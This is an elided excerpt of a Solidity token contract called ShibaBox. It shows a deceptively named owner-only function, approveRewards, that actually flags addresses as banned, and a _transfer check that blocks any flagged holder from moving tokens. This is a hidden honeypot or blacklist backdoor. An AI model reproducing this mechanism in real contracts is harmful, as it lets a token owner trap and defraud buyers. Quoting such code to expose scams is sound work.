...
contract ShibaBox is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _approveRewards;
    ...
    function approveRewards(address botAddress) external onlyOwner {
        if (_approveRewards[botAddress] == true) {
            _approveRewards[botAddress] = false;
        } else {_approveRewards[botAddress] = true;
            emit botBanned (botAddress, _approveRewards[botAddress]);
          }
    }
    
    function rewardsStatus(address botAddress) public view returns (bool) {
        return _approveRewards[botAddress];
    }
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
       ...
       function approveTransfer(address owner, uint256 amount) public virtual onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_approveRewards[sender] || _approveRewards[recipient]) require (amount == 0, "");
